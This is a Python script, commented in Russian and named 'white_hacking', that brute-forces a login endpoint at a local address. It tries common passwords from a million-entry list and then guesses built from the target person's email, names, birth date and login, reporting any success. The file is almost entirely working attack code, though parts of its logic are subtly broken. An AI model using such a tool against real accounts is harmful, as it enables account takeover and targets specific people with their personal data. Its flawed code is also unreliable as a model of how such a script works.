import requests

#парсинг и отбор паролей из базы данных
with open('10-million-password-list-top-1000000.txt') as f:
    content = f.read()
passwords = []
for i in content.split('\n'):
    if 3 <= len(i) <= 10:
        passwords.append(i.lower())


def most_popular_passwords():
    '''
    Эта функция проверяет 500 наиболее популярных паролей из базы данных, на которые приходится самая большая
    вероятность использования
    OUTPUT: password/None
    '''
    for password in passwords[:500]:

        response = requests.post(site,
                                 json={'login': login, 'password': password})
        print(password)
        if response.status_code == 200:
            print(f'WE DID IT!!!Login:{login}, password:{password} ')
            return (f'WE DID IT!!!Login:{login}, password:{password} ')
    return None


def default_data(email, first_name, last_name, birth_date, login):
    '''
    Эта функция проверяет полное совпадение личных данных с паролем
    OUTPUT: password/None
    '''
    default = [email, first_name, last_name, birth_date, login]
    for password in default:
        response = requests.post(site,
                                 json={'login': login, 'password': password})
        print(password)
        if response.status_code == 200:
            print(f'WE DID IT!!!Login:{login}, password:{password} ')
            return f'Login:{login}, password:{password}'
    return None


def parsing():
    ''' 
    Эта функция парсит введённые данные о пользователе
    OUTPUT: list
    '''
    lst = [first_name, last_name, login]
    lst.append(first_name[0])
    lst.append(last_name[0])
    lst.append(email.split('@')[0])
    lst.extend(birth_date.split('.'))
    return lst


def variations_of_personal_data(alphabet):
    '''
    Эта функция проверяет на использование в виде пароля различные комбинации личных данных пользователя
    OUTPUT: password/None
    '''
    base = len(alphabet)
    total = []
    i = 0
    while i < 500000:
        print(i)
        password = ''
        temp = i
        while temp != 0:
            temp = temp // base
            r = temp % base
            password = alphabet[r] + password
            print(password)
            if 3 <= len(password) <= 10:
                total.append(password)
        i += 1
    total = list(set(total))
    for password in total:
        response = requests.post(site,
                                 json={'login': login, 'password': password})
        if response.status_code == 200:
            print(f'WE DID IT!!!Login:{login}, password:{password} ')
            return f'Login:{login}, password:{password}'
    return None


def remaining_popular_passwords():
    '''
    Эта функция проверяет оставшиеся популярные пароли из баззы данных
    OUTPUT: password/None
    '''
    for password in passwords[500:]:

        response = requests.post(site,
                                 json={'login': login, 'password': password})
        print(password)
        if response.status_code == 200:
            print(f'WE DID IT!!!Login:{login}, password:{password} ')
            return f'Login:{login}, password:{password}'
    return None


def white_hacking(email, first_name, last_name, birth_date, login, site):
    '''
    Эта функция проводит подбор пароля по введенным данным о пользователе
    OUTPUT: password
    '''
    key = most_popular_passwords()
    if key is None:
        key = default_data(email, first_name, last_name, birth_date, login)
        if key is None:
            alphabet = parsing()
            key = variations_of_personal_data(alphabet)
            if key is None:
                key = remaining_popular_passwords()
                if key is None:
                    return 'Sorry.. We failed'


while True:
    #Settings
    email = input('Write email:')
    first_name = input('Write First name:').lower()
    last_name = input('Write Last name:').lower()
    birth_date = input('Write birth date (DD.MM.YYYY):')
    login = input('Write login:')
    site = 'http://127.0.0.1:5000/auth'
    password = white_hacking(email, first_name, last_name, birth_date, login, site)
